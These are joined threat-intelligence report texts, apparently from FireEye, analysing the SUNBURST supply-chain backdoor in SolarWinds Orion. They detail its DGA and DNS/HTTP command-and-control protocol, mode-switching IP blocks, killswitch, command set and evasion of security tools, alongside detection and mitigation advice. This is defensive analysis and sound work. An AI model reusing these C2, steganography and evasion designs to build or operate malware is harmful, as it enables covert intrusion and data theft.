the C2 coordinator, SUNBURST uses a Domain Generation Algorithm (DGA) to construct subdomains of avsvmcloud[.]com and resolves the fully qualified domain names (FQDN) using the system DNS client. The backdoor interprets the DNS responses in an unusual way to receive orders from the C2 coordinator. The DGA generates subdomains with the following DNS suffixes to create the FQDN: .appsync-api.eu-west-1[.]avsvmcloud[.]com .appsync-api.us-west-2[.]avsvmcloud[.]com .appsync-api.us-east-1[.]avsvmcloud[.]com .appsync-api.us-east-2[.]avsvmcloud[.]com A method named Update is responsible for initializing cryptographic helpers for the generation of these random-looking C2 subdomains. Subdomains are generated by concatenating an encoded user ID with an encoding of the system's domain name. The C2 coordinator can recover the victim domain name from the encoded data and likely uses this to route SUNBURST to its final C2 server. A user ID is generated based on three values: MAC address of the first available, non-loopback network interface Domain name HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid value SUNBURST takes the MD5 hash of these combined values and encodes it using a custom XOR scheme. We believe this value is used by UNC2452 to track unique victims. SUNBURST uses four different forms of subdomains to signify the operating mode of the backdoor. Each form contains slightly different information. However, in two of the forms, investigators can recover the domain names of victim organizations. We recommend reviewing DNS logs to confirm the presence of a victim’s domain in SUNBURST C2 coordinator traffic. When SUNBURST is in its initial mode, it embeds the domain of the victim organization in its DGA-generated domain prefix. Once the malware transitions to an “active” mode, the malware uses the other two forms of subdomains. These do not include the AD domain, but instead include encodings of either the list of running and stopped services or a timestamp. The open-source community has done a fantastic job reverse engineering many of the subdomain forms. While we are not aware of any public decoder scripts that reverse all four possible encodings, most decoders focus on recovering the most useful information: the user ID and domain name embedded in the subdomains. We recommend that incident responders for victim organizations with access to DNS logs use these tools to confirm their AD domains are not embedded within SUNBURST generated DNS subdomains. Note that this does not indicate follow-on activity. The following sources may be referenced for decoding such domains: https://securelist.com/sunburst-connecting-the-dots-in-the-dns-requests/99862/ https://github.com/RedDrip7/SunBurst_DGA_Decode https://blog.cloudflare.com/a-quirk-in-the-sunburst-dga-algorithm/ Figure 1: Diagram of actor operations and usage of SUNBURST Command and Control SUNBURST uses a two-part C2 protocol that involves both DNS and HTTP. In “passive” mode, the backdoor communicates with its C2 coordinator via DNS and receives high-level updates to its state. For example, the C2 coordinator may tell the backdoor to go to sleep or spring into action. When the backdoor is in “active” mode, it communicates via HTTP to its final C2 server and receives detailed commands such as “spawn a process” or “transfer a file”. DNS C2 and the C2 Coordinator Protocol When communicating with the C2 coordinator, the backdoor continuously generates domains via its DGA. The backdoor delays execution for random intervals between generating domains. In some cases, this delay is up to 9 hours. If the C2 coordinator responds with a DNS A record, SUNBURST checks the resolved address against a hard-coded list of IP address blocks. If the address falls within a block, the backdoor transitions into an associated mode. The backdoor starts in the “passive” mode where it does nothing but check blocklists, sleep, and beacon via DNS until a transition is seen. Other modes are “active”, in which the malware communicates via HTTP, and “disabled”, in which the malware is permanently disabled. These modes and transitions are defined in the Modes of Operation section. The C2 coordinator may also respond with a DNS CNAME response. In this case, the malware uses the pointed-to domain from the CNAME response for HTTPS C2 communications. SUNBURST starts a thread to handle command execution and further C2 HTTP(S) callouts. As an investigator, if you see CNAME resolutions for subdomains of avsvmcloud[.]com, it‘s possible that UNC2452 initiated follow-on C2 within the environment. Note, the malware must receive a DNS A record response pointing to one of the following subnets immediately prior to receiving a DNS CNAME response. Otherwise, the CNAME resolution will be ignored and treated as an error. In addition, for these subnets, the least-significant bytes from the A record IP address are parsed to obtain configuration data such as the proxy method to use, the URI scheme to use, and a delay value used in the HTTP thread. 18.130.0.0/16 99.79.0.0/16 184.72.0.0/15 Subsequent DNS A record responses in the following subnet ranges cause the DGA beaconing to continue. 8.18.144.0/23 18.130.0.0/16 71.152.53.0/24 99.79.0.0/16 87.238.80.0/21 199.201.117.0/24 184.72.0.0/15 Otherwise, subsequent DNS A record responses in the following subnet ranges cause SUNBURST to terminate and update the configuration key ReportWatcherRetry to a value that prevents further execution. This is the killswitch. 10.0.0.0/8 fc00:: - fe00:: 96.31.172.0/24 172.16.0.0/12 fec0:: - ffc0:: 131.228.12.0/22 192.168.0.0/16 ff00:: - ff00:: 144.86.226.0/24 224.0.0.0/3 20.140.0.0/15 While in “active” mode, the DGA subdomain encoding does not include victim machine domain name information. Instead, the DGA subdomains encode a timestamp or the list of stopped/running services. To transition back to “passive” mode, the malware operator may set the DNS server to resolve A records within the following IP ranges: 41.84.159.0/24 74.114.24.0/21 154.118.140.0/24 217.163.7.0/24 If the malware is transitioned from the “active” mode back to “passive”, the C2 coordinator must repeat the activation process if the operator wants to re-activate the sample. HTTP(S) C2 After receiving a CNAME DNS response with a new host to communicate with, SUNBURST starts a new thread to execute the method HttpHelper.Initialize . This method is responsible for the C2 communications and dispatching. The HTTP thread begins by delaying for a configurable amount of time that is controlled by the SetTime command. The HTTP thread delays for a minimum of one minute between callouts. The malware uses HTTP GET or POST requests. The sample disables certificate verification so it is possible to decrypt HTTPS traffic if SSL man-in-the-middle is performed. The malware constructs HTTP GET or POST request URIs from random selections of substrings. The scheme used depends on the A record received just prior to the CNAME DNS response. When sending a GET request, the malware adds an \"If-None-Match\" HTTP header that includes the encoded user ID. This likely allows the C2 server to determine which SUNBURST installation generated the request, further enabling multiplexing of C2 streams on a single server. In observed traffic, the C2 server employs steganography to hide data within HTTP response bodies and attempts to appear as benign XML related to .NET assemblies. Command data is spread across many GUID and hexadecimal strings. Commands are extracted from HTTP response bodies by searching for hexadecimal strings using the following regular expression: \"\\{[0-9a-f-]{36}\\}\"|\"[0-9a-f]{32}\"|\"[0-9a-f]{16}\" . Matched substrings in the response are filtered for non-hex characters, joined together, and hex-decoded. Depending on the mode of operation, the malware may skip the steganography and send the encoded response in an HTTP response body. Figure 2: C2 response embeds commands in XML GUIDs In the received C2 response, the first DWORD value indicates the actual size of the message. This value is followed immediately by the message with optional junk bytes added. The extracted message is single-byte XOR decoded using the first byte of the message. The result is then DEFLATE decompressed. The first character of the decompressed data is an ASCII integer that maps to a command ID, with optional additional command arguments delimited by space characters. The supported commands are shown in the following table. Command ID Operation Idle 0 No operation Exit 1 Terminate the current thread. SetTime 2 Sets the delay time between main event loop executions Delay is in seconds, and varies random between [.9 * <delay>, 1.1 * <delay>] If the delay is < 300 it is doubled on the next execution through the loop, this means it should settle onto an interval of around [5, 10] minutes o There is a second, unrelated delay routine that delays for a random interval between [16hrs, 83hrs] CollectSystemDescription 3 Profile the local system including hostname, username, OS version, MAC addresses, IP address, DHCP configuration, and domain information. UploadSystemDescription 4 Perform an HTTP request to the specified URL, parse the results and send the response to the C2 server. RunTask 5 Starts a new process with the given file path and arguments GetProcessByDescription 6 Returns a process listing. If no arguments are provided, returns just the PID and process name.  If an argument is provided, it also returns the parent PID and username and domain for the process owner. KillTask 7 Terminate the given process, by PID. GetFileSystemEntries 8 Given a path, and a match pattern recursively list files and directories. WriteFile 9 Given a file path and a Base64-encoded string write the contents of the Base64 string to the given file path. Write using append mode. Delay for [1s, 2s] after writing is done. FileExists 10 Tests whether the given file path exists. DeleteFile 11 Deletes the specified file path. GetFileHash 12 Compute the MD5 of a file at a given path and return the result as a hex string. If an argument is provided, it is the expected MD5 hash of the file and returns an error if the calculated MD5 differs. ReadRegistryValue 13 Arbitrary registry read from one of the supported hives. SetRegistryValue 14 Arbitrary registry write from one of the supported hives. DeleteRegistryValue 15 Arbitrary registry delete from one of the supported hives. GetRegistrySubKeyAndValueNames 16 Returns listing of subkeys and value names beneath the given registry path. Reboot 17 Attempts to immediately trigger a system reboot. SUNBURST sends messages back to the C2 server using a protocol that consists of UTF-8 strings and an appended 4-byte error DWORD and 8-byte userID. These are bare DEFLATE compressed and single-byte XOR encoded with the XOR key prepended to the message. Message payloads of length 10,000 or less are turned into JSON documents that resemble the Orion Improvement Program (OIP) messages used legitimately by SolarWinds. Messages larger than 10,000 bytes are sent as-is in the HTTP request body. The fake OIP document contains the following fields: userId – a unique identifier for the victim machine sessionID – stores a new random GUID for each HTTP thread steps – an array of objects that contain the following keys: Timestamp , Index , EventType , EventName , DurationMs , Succeeded , and Message . The JSON key EventType is hard-coded to the value Orion and the EventName is hard-coded to EventManager . The encoded message to send to the C2 server is split up into random ranges, Base64-encoded, and stored in the Message field of the objects in the steps array. Not all objects in the steps array contribute to the malware response. The integer in the Timestamp field must have the 0x2 bit set to indicate the contents of the Message field are used in the malware response. steps objects whose 0x2 bit is clear in the Timestamp field contain random data and are discarded when assembling the malware response. This may be an attempt to hinder analysis in the absence of the malware sample. Figure 3: HTTP callout masquerades as OIP protocol Modes of Operation As detailed in the DGA section, the malware has multiple modes of operation configured by the IP block that A records resolve to as well as depending on if CNAME records exist. These modes of operation are stored in internal enumerations. These mappings and values are described next. Internal Modes The following modes govern internal operations of the malware: Mode Name Value Description Truncate 3 Disabled; the malware killswitch has been activated and the sample may never run again without external modification to the XML configuration on-disk. New 4 Passive mode; DGA subdomains encode the system’s domain name Append 5 Active mode; C2 beaconing will occur on next CNAME resolve or is already actively occurring. DGA domains encode either the userID or the list of services The mode values are written into the backdoor configuration key ReportWatcherRetry . Investigators may consider recovering the malware configuration and inspecting this configuration value to determine the last running mode of the malware. The following transitions govern how IP block ranges are translated into running modes: Transition Name Description Atm Transition to Truncate Ipx Transition from Append to New ImpLink Transition to Truncate NetBios Transition to Append, either start or continue C2 beaconing Unknown Not an IPv4 or IPv6 address, exit and retry DGA later The following diagram describes how the SUNBURST’s DGA DNS responses act as mode transitions to control the malware before HTTP-based C2 beaconing has even begun: Additionally, here is an annotated network log showing how a sequence of DNS resolutions can transition the malware mode: To end this discussion of modes and transitions, a small note about the choices of these IP blocks. In cases such as the ImpLink IP blocks that activate the killswitch, it’s likely that the ranges were specifically chosen by the attacker to avoid being discovered by security researchers. In other cases, such as the NetBios and \"special\" NetBios IP blocks, the companies these blocks resolve to is likely irrelevant or at least beyond what can be definitively said without speculation. Malware Flow Diagram The following diagram provides a full picture of the malware's execution. Internally, SUNBURST uses a set of modes and transitions as described earlier. The names of these modes and transitions have no meaning. The malware authors purposely chose them as a form of obfuscation. When diagraming the malware's execution, these names were reused for clarity. Figure 4: Malware logic and decision states Q&A Is a system running blocklisted processes, services, or drivers safe from compromise? Sometimes, but not always. SUNBURST unconditionally exits if blocklisted processes or drivers are found and will not run until they are no longer detected. On the other hand, services are disabled by setting a registry value that controls startup initialization and are not explicitly stopped. As a result, a blocklisted service may still be running when the malware performs its service checks later. For this reason, it is possible for a victim system to be infected while a blocklisted service is running. Additionally, SUNBURST only attempts to disable a service once and updates its configuration to mark the service as disabled. Once the configuration is updated, the service is not treated as a blocklisted entry during subsequent execution. Does observing one DGA encoding over another provide any information during incident response? Short answer: it provides a hint for where to look but isn’t a be-all tell-all alone. Noticing the DGA encoding change in network logs is a hint that the malware may have moved from New to Append or Append to New. This puts the malware in a mode where if a CNAME record is seen soon after, then HTTP C2 can begin. Incident response should focus on trying to identify CNAME records being successfully resolved instead of focusing on DGA encodings entirely. Identifying CNAME records is easier than tracking the malware mode through logs and a stronger signal. What is the \"killswitch\"? FireEye discovered that certain DNS responses cause the malware to disable itself and stop further network activity. With the support and help of GoDaddy’s Abuse Team and the Microsoft Threat Intelligence Center, the domain used for resolving DGA domains was reconfigured to point to a sinkhole server under Microsoft’s control. The IP of this sinkhole server was specially chosen to fall into the range used by the malware to transition from its current mode (New or Append) into Truncate mode where it will be permanently inactive. In other words, SUNBURST infections should now be inoculated due to the killswitch. When C2 communication occurs, is a CNAME record required? CNAME records are required for HTTP C2 beaconing to occur and are provided by the C2 coordinator to specify the final C2 server. C2 activity must occur over a domain name provided via a CNAME record. It cannot occur directly via a raw IP. To initialize C2 beaconing, the backdoor first looks for an A record response from one of its special NetBios subnets and subsequently expects to receive a CNAME record. If a DGA domain is decoded to a company domain name, is that company compromised? When the backdoor is in “passive” mode it uses the DGA encoding which embeds victim AD domain names. This means that any system where the backdoor is present may have started trying to contact DNS servers where an attacker could then activate the backdoor to begin active C2 communications. In most cases this did not occur and backdoors for non-targets were disabled by the operator. Therefore, it cannot be assumed that an organization experienced follow-on activity if their domain is decoded from any DNS logs. Specifically, it’s only an indicator that the backdoor code was present and capable of being activated. Public Contributions We have seen substantial community contributions to our public SUNBURST GitHub repository . We would like to publicly thank all contributors to this repository. Specifically, all FNV hashes embedded within SUNBURST have been brute-forced. This is a huge amount of compute power that members of the community provided free-of-charge to help others. We want to thank everyone who contributed hashes and specifically callout the Hashcat community, which organized to systematically break each hash. This was essential for breaking the final few hashes whose preimage were of considerable length. Acknowledgements Matthew Williams, Michael Sikorski, Alex Berry and Robert Wallace.

                "text": "Executive Summary We have discovered a global intrusion campaign. We are tracking the actors behind this campaign as UNC2452. FireEye discovered a supply chain attack trojanizing SolarWinds Orion business software updates in order to distribute malware we call SUNBURST. The attacker’s post compromise activity leverages multiple techniques to evade detection and obscure their activity, but these efforts also offer some opportunities for detection. The campaign is widespread, affecting public and private organizations around the world. FireEye is releasing signatures to detect this threat actor and supply chain attack in the wild. These are found on our public GitHub page . FireEye products and services can help customers detect and block this attack. Summary FireEye has uncovered a widespread campaign, that we are tracking as UNC2452. The actors behind this campaign gained access to numerous public and private organizations around the world. They gained access to victims via trojanized updates to SolarWind’s Orion IT monitoring and management software. This campaign may have begun as early as Spring 2020 and is currently ongoing. Post compromise activity following this supply chain compromise has included lateral movement and data theft. The campaign is the work of a highly skilled actor and the operation was conducted with significant operational security. SUNBURST Backdoor SolarWinds.Orion.Core.BusinessLayer.dll is a SolarWinds digitally-signed component of the Orion software framework that contains a backdoor that communicates via HTTP to third party servers. We are tracking the trojanized version of this SolarWinds Orion plug-in as SUNBURST. After an initial dormant period of up to two weeks, it retrieves and executes commands, called “Jobs”, that include the ability to transfer files, execute files, profile the system, reboot the machine, and disable system services. The malware masquerades its network traffic as the Orion Improvement Program (OIP) protocol and stores reconnaissance results within legitimate plugin configuration files allowing it to blend in with legitimate SolarWinds activity. The backdoor uses multiple obfuscated blocklists to identify forensic and anti-virus tools running as processes, services, and drivers. Figure 1: SolarWinds digital signature on software with backdoor Multiple trojanzied updates were digitally signed from March - May 2020 and posted to the SolarWinds updates website, including: hxxps://downloads.solarwinds[.]com/solarwinds/CatalogResources/Core/2019.4/2019.4.5220.20574/SolarWinds-Core-v2019.4.5220-Hotfix5.msp The trojanized update file is a standard Windows Installer Patch file that includes compressed resources associated with the update, including the trojanized SolarWinds.Orion.Core.BusinessLayer.dll component. Once the update is installed, the malicious DLL will be loaded by the legitimate SolarWinds.BusinessLayerHost.exe or SolarWinds.BusinessLayerHostx64.exe (depending on system configuration). After a dormant period of up to two weeks, the malware will attempt to resolve a subdomain of avsvmcloud[.]com. The DNS response will return a CNAME record that points to a Command and Control (C2) domain. The C2 traffic to the malicious domains is designed to mimic normal SolarWinds API communications. The list of known malicious infrastructure is available on FireEye’s GitHub page . Worldwide Victims Across Multiple Verticals FireEye has detected this activity at multiple entities worldwide. The victims have included government, consulting, technology, telecom and extractive entities in North America, Europe, Asia and the Middle East. We anticipate there are additional victims in other countries and verticals. FireEye has notified all entities we are aware of being affected. Post Compromise Activity and Detection Opportunities We are currently tracking the software supply chain compromise and related post intrusion activity as UNC2452. After gaining initial access, this group uses a variety of techniques to disguise their operations while they move laterally (Figure 2). This actor prefers to maintain a light malware footprint, instead preferring legitimate credentials and remote access for access into a victim’s environment. Figure 2: Post-compromise tactics This section will detail the notable techniques and outline potential opportunities for detection. TEARDROP and BEACON Malware Used Multiple SUNBURST samples have been recovered, delivering different payloads. In at least one instance the attackers deployed a previously unseen memory-only dropper we’ve dubbed TEARDROP to deploy Cobalt Strike BEACON. TEARDROP is a memory only dropper that runs as a service, spawns a thread and reads from the file “gracious_truth.jpg”, which likely has a fake JPG header. Next it checks that HKU\\SOFTWARE\\Microsoft\\CTF exists, decodes an embedded payload using a custom rolling XOR algorithm and manually loads into memory an embedded payload using a custom PE-like file format. TEARDROP does not have code overlap with any previously seen malware. We believe that this was used to execute a customized Cobalt Strike BEACON. Mitigation : FireEye has provided two Yara rules to detect TEARDROP available on our GitHub . Defenders should look for the following alerts from FireEye HX: MalwareGuard and WindowsDefender: Process Information file_operation_closed file-path*: “c:\\\\windows\\\\syswow64\\\\netsetupsvc.dll actor-process: pid: 17900 Window’s defender Exploit Guard log entries: (Microsoft-Windows-Security-Mitigations/KernelMode event ID 12) Process”\\Device\\HarddiskVolume2\\Windows\\System32\\svchost.exe” (PID XXXXX) would have been blocked from loading the non-Microsoft-signed binary ‘\\Windows\\SysWOW64\\NetSetupSvc.dll’ Attacker Hostnames Match Victim Environment The actor sets the hostnames on their command and control infrastructure to match a legitimate hostname found within the victim’s environment. This allows the adversary to blend into the environment, avoid suspicion, and evade detection. Detection Opportunity The attacker infrastructure leaks its configured hostname in RDP SSL certificates, which is identifiable in internet-wide scan data. This presents a detection opportunity for defenders -- querying internet-wide scan data sources for an organization’s hostnames can uncover malicious IP addresses that may be masquerading as the organization. (Note: IP Scan history often shows IPs switching between default (WIN-*) hostnames and victim’s hostnames) Cross-referencing the list of IPs identified in internet scan data with remote access logs may identify evidence of this actor in an environment. There is likely to be a single account per IP address. IP Addresses located in Victim’s Country The attacker’s choice of IP addresses was also optimized to evade detection. The attacker primarily used only IP addresses originating from the same country as the victim, leveraging Virtual Private Servers. Detection Opportunity This also presents some detection opportunities, as geolocating IP addresses used for remote access may show an impossible rate of travel if a compromised account is being used by the legitimate user and the attacker from disparate IP addresses. The attacker used multiple IP addresses per VPS provider, so once a malicious login from an unusual ASN is identified, looking at all logins from that ASN can help detect additional malicious activity. This can be done alongside baselining and normalization of ASN’s used for legitimate remote access to help identify suspicious activity. Lateral Movement Using Different Credentials Once the attacker gained access to the network with compromised credentials, they moved laterally using multiple different credentials. The credentials used for lateral movement were always different from those used for remote access. Detection Opportunity Organizations can use HX’s LogonTracker module to graph all logon activity and analyze systems displaying a one-to-many relationship between source systems and accounts. This will uncover any single system authenticating to multiple systems with multiple accounts, a relatively uncommon occurrence during normal business operations. Temporary File Replacement and Temporary Task Modification The attacker used a temporary file replacement technique to remotely execute utilities: they replaced a legitimate utility with theirs, executed their payload, and then restored the legitimate original file. They similarly manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returning the scheduled task to its original configuration. They routinely removed their tools, including removing backdoors once legitimate remote access was achieved. Detection Opportunity Defenders can examine logs for SMB sessions that show access to legitimate directories and follow a delete-create-execute-delete-create pattern in a short amount of time. Additionally, defenders can monitor existing scheduled tasks for temporary updates, using frequency analysis to identify anomalous modification of tasks. Tasks can also be monitored to watch for legitimate Windows tasks executing new or unknown binaries. This campaign’s post compromise activity was conducted with a high regard for operational security, in many cases leveraging dedicated infrastructure per intrusion. This is some of the best operational security that FireEye has observed in a cyber attack, focusing on evasion and leveraging inherent trust. However, it can be detected through persistent defense. In-Depth Malware Analysis SolarWinds.Orion.Core.BusinessLayer.dll (b91ce2fa41029f6955bff20079468448) is a SolarWinds-signed plugin component of the Orion software framework that contains an obfuscated backdoor which communicates via HTTP to third party servers. After an initial dormant period of up to two weeks, it retrieves and executes commands, called “Jobs”, that include the ability to transfer and execute files, profile the system, and disable system services. The backdoor’s behavior and network protocol blend in with legitimate SolarWinds activity, such as by masquerading as the Orion Improvement Program (OIP) protocol and storing reconnaissance results within plugin configuration files. The backdoor uses multiple blocklists to identify forensic and anti-virus tools via processes, services, and drivers. Unique Capabilities Subdomain DomainName Generation Algorithm (DGA) is performed to vary DNS requests CNAME responses point to the C2 domain for the malware to connect to The IP block of A record responses controls malware behavior DGA encoded machine domain name, used to selectively target victims Command and control traffic masquerades as the legitimate Orion Improvement Program Code hides in plain site by using fake variable names and tying into legitimate components Delivery and Installation Authorized system administrators fetch and install updates to SolarWinds Orion via packages distributed by SolarWinds’s website. The update package CORE-2019.4.5220.20574-SolarWinds-Core-v2019.4.5220-Hotfix5.msp (02af7cec58b9a5da1c542b5a32151ba1) contains the SolarWinds.Orion.Core.BusinessLayer.dll described in this report. After installation, the Orion software framework executes the .NET program SolarWinds.BusinessLayerHost.exe to load plugins, including SolarWinds.Orion.Core.BusinessLayer.dll. This plugin contains many legitimate namespaces, classes, and routines that implement functionality within the Orion framework. Hidden in plain sight, the class SolarWinds.Orion.Core.BusinessLayer.OrionImprovementBusinessLayer implements an HTTP-based backdoor. Code within the logically unrelated routine SolarWinds.Orion.Core.BusinessLayer.BackgroundInventory.InventoryManager.RefreshInternal invokes the backdoor code when the Inventory Manager plugin is loaded. SolarWinds.Orion.Core.BusinessLayer.dll is signed by SolarWinds, using the certificate with serial number 0f:e9:73:75:20:22:a6:06:ad:f2:a3:6e:34:5d:c0:ed. The file was signed on March 24, 2020. Initialization On execution of the malicious SolarWinds.Orion.Core.BusinessLayer.OrionImprovementBusinessLayer.Initialize method the sample verifies that its lower case process name hashes to the value 17291806236368054941. This hash value is calculated as the standard FNV-1A 64-bit hash with an additional XOR by 6605813339339102567 after computing the FNV-1A. This hash matches a process named \"solarwinds.businesslayerhost\". The sample only executes if the filesystem write time of the assembly is at least 12 to 14 days prior to the current time; the exact threshold is selected randomly from an interval. The sample continues to check this time threshold as it is run by a legitimate recurring background task. Once the threshold is met, the sample creates the named pipe 583da945-62af-10e8-4902-a8f205c72b2e to act as a guard that only one instance is running before reading SolarWinds.Orion.Core.BusinessLayer.dll.config from disk and retrieving the XML field appSettings. The appSettings fields’ keys are legitimate values that the malicious logic re-purposes as a persistent configuration. The key ReportWatcherRetry must be any value other than 3 for the sample to continue execution. The sample checks that the machine is domain joined and retrieves the domain name before execution continues. A userID is generated by computing the MD5 of a network interface MAC address that is up and not a loopback device, the domain name, and the registry value HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid. The userID is encoded via a custom XOR scheme after the MD5 is calculated. The ReportWatcherPostpone key of appSettings is then read from SolarWinds.Orion.Core.BusinessLayer.dll.config to retrieve the initial, legitimate value. This operation is performed as the sample later bit packs flags into this field and the initial value must be known in order to read out the bit flags. The sample then invokes the method Update which is the core event loop of the sample. DGA and Blocklists The backdoor determines its C2 server using a Domain Generation Algorithm (DGA) to construct and resolve a subdomain of avsvmcloud[.]com. The Update method is responsible for initializing cryptographic helpers for the generation of these random C2 subdomains. Subdomains are generated by concatenating a victim userId with a reversible encoding of the victims local machine domain name. The attacker likely utilizes the DGA subdomain to vary the DNS response to victims as a means to control the targeting of the malware. These subdomains are concatenated with one of the following to create the hostname to resolve: .appsync-api.eu-west-1[.]avsvmcloud[.]com .appsync-api.us-west-2[.]avsvmcloud[.]com .appsync-api.us-east-1[.]avsvmcloud[.]com .appsync-api.us-east-2[.]avsvmcloud[.]com Process name, service name, and driver path listings are obtained, and each value is hashed via the FNV-1a + XOR algorithm as described previously and checked against hardcoded blocklists. Some of these hashes have been brute force reversed as part of this analysis, showing that these routines are scanning for analysis tools and antivirus engine components. If a blocklisted process is found the Update routine exits and the sample will continue to try executing the routine until the blocklist passes. Blocklisted services are stopped by setting their HKLM\\SYSTEM\\CurrentControlSet\\services\\<service_name>\\Start registry entries to value 4 for disabled. Some entries in the service list if found on the system may affect the DGA algorithms behavior in terms of the values generated. The list of stopped services is then bit-packed into the ReportWatcherPostpone key of the appSettings entry for the samples’ config file. If any service was transitioned to disabled the Update method exits and retries later. The sample retrieves a driver listing via the WMI query Select * From Win32_SystemDriver. If any blocklisted driver is seen the Update method exits and retries. If all blocklist tests pass, the sample tries to resolve api.solarwinds.com to test the network for connectivity. Network Command and Control (C2) If all blocklist and connectivity checks pass, the sample starts generating domains in a while loop via its DGA. The sample will delay for random intervals between the generation of domains; this interval may be any random value from the ranges 1 to 3 minutes, 30 to 120 minutes, or on error conditions up to 420 to 540 minutes (9 hours). The DNS A record of generated domains is checked against a hardcoded list of IP address blocks which control the malware’s behavior. Records within the following ranges will terminate the malware and update the configuration key ReportWatcherRetry to a value that prevents further execution: 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 224.0.0.0/3 fc00:: - fe00:: fec0:: - ffc0:: ff00:: - ff00:: 20.140.0.0/15 96.31.172.0/24 131.228.12.0/22 144.86.226.0/24 Once a domain has been successfully retrieved in a CNAME DNS response the sample will spawn a new thread of execution invoking the method HttpHelper.Initialize which is responsible for all C2 communications and dispatching. The HTTP thread begins by delaying for a configurable amount of time that is controlled by the SetTime command. The HTTP thread will delay for a minimum of 1 minute between callouts. The malware uses HTTP GET or HTTP POST requests. If the sample is attempting to send outbound data the content-type HTTP header will be set to \"application/octet-stream\" otherwise to \"application/json\". A JSON payload is present for all HTTP POST and PUT requests and contains the keys “userId”, “sessionId”, and “steps”. The “steps” field contains a list of objects with the following keys: “Timestamp”, “Index”, “EventType”, “EventName”, “DurationMs”, “Succeeded”, and “Message”. The JSON key “EventType” is hardcoded to the value “Orion”, and the “EventName” is hardcoded to “EventManager”. Malware response messages to send to the server are DEFLATE compressed and single-byte-XOR encoded, then split among the “Message” fields in the “steps” array. Each “Message” value is Base64 encoded separately. Not all objects in the “steps” array contribute to the malware message – the integer in the “Timestamp” field must have the 0x2 bit set to indicate that the contents of the “Message” field are used in the malware message. Step objects whose bit 0x2 is clear in the Timestamp field contain random data and are discarded when assembling the malware response. Steganography In observed traffic these HTTP response bodies attempt to appear like benign XML related to .NET assemblies, but command data is actually spread across the many GUID and HEX strings present. Commands are extracted from HTTP response bodies by searching for HEX strings using the following regular expression: \"\\{[0-9a-f-]{36}\\}\"|\"[0-9a-f]{32}\"|\"[0-9a-f]{16}\". Command data is spread across multiple strings that are disguised as GUID and HEX strings. All matched substrings in the response are filtered for non HEX characters, joined together, and HEX-decoded. The first DWORD value shows the actual size of the message, followed immediately with the message, with optional additional junk bytes following. The extracted message is single-byte XOR decoded using the first byte of the message, and this is then DEFLATE decompressed. The first character is an ASCII integer that maps to the JobEngine enum, with optional additional command arguments delimited by space characters. Commands are then dispatched to a JobExecutionEngine based upon the command value as described next. Supported Commands Command Value Operation Idle 0 No operation Exit 1 Terminate the current thread. SetTime 2 Sets the delay time between main event loop executions Delay is in seconds, and varies random between [.9 * <delay>, 1.1 * <delay>].          If the delay is < 300 it is doubled on the next execution through the loop, this means it should settle onto an interval of around [5, 10] minutes.         There is a second, unrelated delay routine that delays for a random interval between [16hrs, 83hrs] CollectSystemDescription 3 Profile the local system including hostname, username, OS version, MAC addresses, IP address, DHCP configuration, and domain information. UploadSystemDescription 4 Perform a HTTP request to the specified URL, parse the results and compare components against unknown hashed values. Format a report and send to the C2 server. RunTask 5 Starts a new process with the given file path and arguments GetProcessByDescription 6 Returns a process listing. If no arguments are provided returns just the PID and process name.        If an argument is provided it also returns the parent PID and username and domain for the process owner. KillTask 7 Terminate the given process, by PID. GetFileSystemEntries 8 Given a path and an optional match pattern recursively list files and directories WriteFile 9 Given a file path and a Base64 encoded string write the contents of the Base64 decoded string to the given file path. Write using append mode. Delay for [1s, 2s] after writing is done. FileExists 10 Tests whether the given file path exists. DeleteFile 11 Deletes the specified file path. GetFileHash 12 Compute the MD5 of a file at a given path and return result as a HEX string. If an argument is provided, it is the expected MD5 hash of the file and returns an error if the calculated MD5 differs. ReadRegistryValue 13 Arbitrary registry read from one of the supported hives SetRegistryValue 14 Arbitrary registry write from one of the supported hives. DeleteRegistryValue 15 Arbitrary registry delete from one of the supported hives GetRegistrySubKeyAndValueNames 16 Returns listing of subkeys and value names beneath the given registry path Reboot 17 Attempts to immediately trigger a system reboot. Indicators and Detections to Help the Community To empower the community to detect this supply chain backdoor, we are publishing indicators and detections to help organizations identify this backdoor and this threat actor. The signatures are a mix of Yara, IOC, and Snort formats. A list of the detections and signatures are available on the FireEye GitHub repository found here . We are releasing detections and will continue to update the public repository with overlapping detections for host and network-based indicators as we develop new or refine existing ones. We have found multiple hashes with this backdoor and we will post updates of those hashes.

Applying an upgrade to an impacted box could potentially overwrite forensic evidence as well as leave any additional backdoors on the system. In addition, SolarWinds has released additional mitigation and hardening instructions here . In the event you are unable to follow SolarWinds’ recommendations, the following are immediate mitigation techniques that could be deployed as first steps to address the risk of trojanized SolarWinds software in an environment. If attacker activity is discovered in an environment, we recommend conducting a comprehensive investigation and designing and executing a remediation strategy driven by the investigative findings and details of the impacted environment. Ensure that SolarWinds servers are isolated / contained until a further review and investigation is conducted. This should include blocking all Internet egress from SolarWinds servers. If SolarWinds infrastructure is not isolated, consider taking the following steps: Restrict scope of connectivity to endpoints from SolarWinds servers, especially those that would be considered Tier 0 / crown jewel assets Restrict the scope of accounts that have local administrator privileged on SolarWinds servers. Block Internet egress from servers or other endpoints with SolarWinds software. Consider (at a minimum) changing passwords for accounts that have access to SolarWinds servers / infrastructure. Based upon further review / investigation, additional remediation measures may be required. If SolarWinds is used to managed networking infrastructure, consider conducting a review of network device configurations for unexpected / unauthorized modifications. Note, this is a proactive measure due to the scope of SolarWinds functionality, not based on investigative findings.

                "text": "Overview A highly sophisticated state-sponsored adversary stole FireEye Red Team tools. Because we believe that an adversary possesses these tools, and we do not know whether the attacker intends to use the stolen tools themselves or publicly disclose them, FireEye is releasing hundreds of countermeasures with this blog post to enable the broader security community to protect themselves against these tools. We have incorporated the countermeasures in our FireEye products—and shared these countermeasures with partners, government agencies—to significantly limit the ability of the bad actor to exploit the Red Team tools. You can find a list of the countermeasures on the FireEye GitHub repository found HERE . Red Team Tools and Techniques A Red Team is a group of security professionals authorized and organized to mimic a potential adversary’s attack or exploitation capabilities against an enterprise’s security posture. Our Red Team’s objective is to improve enterprise cyber security by demonstrating the impacts of successful attacks and by showing the defenders (i.e., the Blue Team) how to counter them in an operational environment. We have been performing Red Team assessments for customers around the world for over 15 years. In that time, we have built up a set of scripts, tools, scanners, and techniques to help improve our clients’ security postures. Unfortunately, these tools were stolen by a highly sophisticated attacker. The stolen tools range from simple scripts used for automating reconnaissance to entire frameworks that are similar to publicly available technologies 